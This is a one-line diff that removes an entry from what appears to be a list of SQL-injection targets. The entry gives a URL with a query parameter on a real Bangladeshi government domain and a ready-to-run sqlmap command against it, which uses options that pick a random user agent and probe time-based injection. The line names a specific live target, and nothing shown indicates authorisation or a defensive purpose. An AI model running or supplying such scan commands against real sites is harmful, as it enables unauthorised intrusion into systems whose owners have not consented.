@@ -1,1 +1,0 @@
-https://cmp.gov.bd/index.php?cPath=250 (GET)  # sqlmap.py -u https://cmp.gov.bd/index.php?cPath=250 --batch --banner --random-agent --time-sec=10
